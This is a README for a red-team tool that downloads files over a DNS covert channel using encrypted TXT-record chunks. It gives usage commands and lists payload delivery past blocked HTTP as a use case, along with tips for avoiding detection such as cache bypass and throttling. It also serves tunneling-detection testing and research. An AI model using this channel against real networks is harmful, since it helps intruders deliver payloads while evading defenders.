# DNS Downloader

File download tool over DNS covert channel. Reverse of DNSExfiltrator - instead of upload/exfiltration, this tool allows downloading files from server to client via DNS TXT records.

## How It Works

```
┌─────────────────────────────────────────────────────────────┐
│  CLIENT                                  SERVER             │
├─────────────────────────────────────────────────────────────┤
│  1. Query: init.domain.com                                  │
│     ├─> Response: TXT "filename|chunks|encoding|checksum"  │
│                                                              │
│  2. Query: chunk-0.<random>.domain.com                      │
│     ├─> Response: TXT "base64_data_chunk_0"                │
│                                                              │
│  3. Query: chunk-1.<random>.domain.com                      │
│     ├─> Response: TXT "base64_data_chunk_1"                │
│     ...                                                      │
│                                                              │
│  N. Reassemble → Decode → Decrypt (RC4) → Unzip → Save     │
└─────────────────────────────────────────────────────────────┘
```

## Installation

### Python Client

```bash
pip install -r requirements.txt
```

### C# Client

```batch
build.bat
```

Or manually:

```batch
csc /t:exe /out:DnsDownloader.exe /r:System.IO.Compression.dll /r:System.IO.Compression.FileSystem.dll DnsDownloader.cs
```

## Usage

### Server (File Provider)

```bash
# Run with root privileges (port 53)
sudo python3 dns_server.py -d yourdomain.com -f /path/to/file -p password

# With options
sudo python3 dns_server.py \
    -d yourdomain.com \
    -f /path/to/file \
    -p password \
    -b32              # Use Base32 instead of Base64URL
    -c 150            # Chunk size (default: 200)
    -P 5353           # Alternative port (default: 53)
```

### Client (File Downloader)

**Python Client:**

```bash
python3 dns_downloader.py -d yourdomain.com -p password

# With options
python3 dns_downloader.py \
    -d yourdomain.com \
    -p password \
    -s 192.168.1.100  # DNS server IP (if not using system DNS)
    -P 5353           # Port (if not 53)
    -o output.txt     # Output filename
    -t 100            # Delay between requests (ms)
    -r 5              # Number of retries per chunk
```

**C# Client:**

```batch
DnsDownloader.exe -d yourdomain.com -p password

# With options
DnsDownloader.exe -d yourdomain.com -p password -s 192.168.1.100 -P 5353 -o output.txt -t 100 -r 5
```

## Local Testing

### Terminal 1 - Server

```bash
# Create test file
echo "Hello from DNS Downloader!" > testfile.txt

# Run server (port 5353 to avoid root requirement)
python3 dns_server.py -d test.local -f testfile.txt -p secret123 -P 5353
```

### Terminal 2 - Python Client

```bash
# Download file
python3 dns_downloader.py -d test.local -p secret123 -s 127.0.0.1 -P 5353 -o downloaded.txt

# Verify
cat downloaded.txt
```

### Terminal 2 - C# Client (Windows)

```batch
# Download file
DnsDownloader.exe -d test.local -p secret123 -s 127.0.0.1 -P 5353 -o downloaded.txt

# Verify
type downloaded.txt
```

## Parameters

### Server (dns_server.py)

| Parameter          | Description               | Required |
| ------------------ | ------------------------- | -------- |
| `-d, --domain`     | Domain name               | ✓        |
| `-f, --file`       | File to serve             | ✓        |
| `-p, --password`   | Encryption password       | ✓        |
| `-b32, --base32`   | Use Base32 encoding       |          |
| `-c, --chunk-size` | Chunk size (default: 200) |          |
| `-P, --port`       | DNS port (default: 53)    |          |

### Client (dns_downloader.py / DnsDownloader.exe)

| Parameter        | Description                 | Required |
| ---------------- | --------------------------- | -------- |
| `-d, --domain`   | Domain name                 | ✓        |
| `-p, --password` | Decryption password         | ✓        |
| `-s, --server`   | DNS server IP               |          |
| `-P, --port`     | DNS port (default: 53)      |          |
| `-o, --output`   | Output filename             |          |
| `-t, --throttle` | Delay between requests (ms) |          |
| `-r, --retries`  | Number of retries per chunk |          |

## Features

- **Encryption**: RC4 (compatible with DNSExfiltrator)
- **Compression**: ZIP
- **Encoding**: Base64URL (default) or Base32
- **Checksum**: File integrity verification
- **DNS Cache Bypass**: Random nonce in each query
- **Retry Mechanism**: Auto-retry on chunk failure
- **Cross-Platform**: Python (Linux/Windows/Mac) and C# (Windows)

## Use Cases

1. **Red Team**: Deliver payloads to targets via DNS when HTTP/HTTPS is blocked
2. **Security Testing**: Test DNS tunneling detection capabilities
3. **Research**: Study covert channel techniques
4. **Data Retrieval**: Download tools/scripts in restricted environments

## Implementation Details

### Data Flow (Server)

```
Original File → ZIP Compress → RC4 Encrypt → Base64URL/Base32 Encode → Split into Chunks
```

### Data Flow (Client)

```
Download Chunks → Concatenate → Decode → RC4 Decrypt → ZIP Decompress → Verify Checksum → Save
```

### DNS Packet Structure

**INIT Request:**

- Query: `init.<domain>`
- Response: `filename|total_chunks|encoding|checksum`

**CHUNK Request:**

- Query: `chunk-N.<random_nonce>.<domain>`
- Response: Base64URL/Base32 encoded data chunk

## Security Considerations

- Requires authoritative DNS server or direct server access
- For production use, setup NS record pointing to your server
- Slower than HTTP/FTP - suitable for small/medium files
- DNS logging may detect unusual patterns
- DNS queries are typically not encrypted (unless using DoH/DoT)
- Consider rate limiting to avoid detection

## Platform Support

| Component         | Platform          | Requirements                  |
| ----------------- | ----------------- | ----------------------------- |
| **Server**        | Linux/Windows/Mac | Python 3.x, dnslib            |
| **Python Client** | Linux/Windows/Mac | Python 3.x, dnslib, dnspython |
| **C# Client**     | Windows           | .NET Framework 4.5+           |

## Troubleshooting

**Server not receiving queries:**

- Check firewall rules (allow UDP port)
- Verify server is listening on correct interface (0.0.0.0)
- Test DNS resolution: `nslookup -type=txt init.test.local 127.0.0.1`

**Client connection timeout:**

- Verify DNS server IP and port
- Check network connectivity
- Ensure no DNS filtering/blocking

**Checksum mismatch:**

- Verify password matches on both ends
- Check for packet loss (increase retries)
- Ensure encoding type matches (base32/base64url)

## License

Educational/Research purposes only.
